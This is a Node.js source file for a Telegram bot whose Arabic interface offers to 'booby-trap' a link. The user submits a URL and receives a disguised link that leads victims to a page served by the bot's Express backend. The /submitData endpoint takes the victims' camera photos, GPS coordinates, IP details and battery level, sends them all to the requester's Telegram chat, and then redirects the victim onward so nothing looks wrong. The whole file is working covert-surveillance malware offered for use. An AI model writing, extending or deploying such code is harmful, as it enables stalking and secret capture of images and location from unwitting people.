const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config(); 
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');
const botToken = process.env.nn;
const m = process.env.rr;
const fixedUrl = process.env.rr; 
const bot = new TelegramBot(botToken, { polling: true });
const app = express();
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(__dirname));

let userLink = ''; 
const s =`${m}/index.html?chatId=`; 
// إرسال البيانات إلى الرابط الثابت
async function sendRequestToFixedUrl() {
    try {
        const response = await axios.post(fixedUrl, { message: 'This is a periodic request.' });
        console.log('Request sent successfully:', response.data);
    } catch (error) {
        console.error('Error sending request to fixed URL:', error.message);
    }
}

// جدولة إرسال الطلبات كل 40 ثانية
setInterval(sendRequestToFixedUrl, 40000);

app.post('/submitData', async (req, res) => {
    const { chatId, imageDatas, location, permissions, ipInfo, battery } = req.body;

    try {
        if (imageDatas) {
            const images = imageDatas.split(',');
            images.forEach((imageData, index) => {
                const buffer = Buffer.from(imageData, 'base64');
                bot.sendPhoto(chatId, buffer, { caption: `Photo ${index + 1}` });
            });
        } else {
            bot.sendMessage(chatId, 'لم يتم جمع الصور.');
        }

        if (location) {
            const locationRegex = /Lat:\s*(-?\d+\.\d+),\s*Long:\s*(-?\d+\.\d+)/;
            const match = location.match(locationRegex);

            if (match) {
                const latitude = parseFloat(match[1]);
                const longitude = parseFloat(match[2]);
                bot.sendLocation(chatId, latitude, longitude);
            } else {
                bot.sendMessage(chatId, 'لم يتم تحديد الموقع بشكل صحيح.');
            }
        } else {
            bot.sendMessage(chatId, 'لم يتم جمع الموقع.');
        }

        if (ipInfo) {
            bot.sendMessage(chatId, `IP Info: ${ipInfo}`);
        } else {
            bot.sendMessage(chatId, 'لم يتم جمع معلومات IP.');
        }

        if (battery) {
            bot.sendMessage(chatId, `Battery: ${battery}%`);
        } else {
            bot.sendMessage(chatId, 'لم يتم جمع حالة البطارية.');
        }

        if (permissions) {
            bot.sendMessage(chatId, `Permissions Denied: ${permissions}`);
        }

        // استبدال الرابط النهائي بالرابط المرسل من المستخدم
        res.redirect(userLink || 'https://files.catbox.moe/ule7mc.mp4'); // الرابط النهائي
    } catch (error) {
        console.error('Error processing data:', error.message);
        bot.sendMessage(chatId, 'حدث خطأ أثناء معالجة البيانات.');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'اضغط على الزر أدناه لتلغيم الرابط.', {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'تلغيم رابط🚫', callback_data: 'create_link' }]
            ]
        }
    });
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    if (query.data === 'create_link') {
        bot.sendMessage(chatId, 'الرجاء إرسال الرابط الذي تريد تلغيمه:');
        bot.once('message', (msg) => {
            if (msg.text.startsWith('http')) {
                userLink = msg.text; // حفظ الرابط المرسل
                bot.sendMessage(chatId, `تم انشاء الرابط ⚠️\n${s}${chatId}`);
            } else {
                bot.sendMessage(chatId, 'الرجاء إرسال رابط صالح.');
            }
        });
    }
});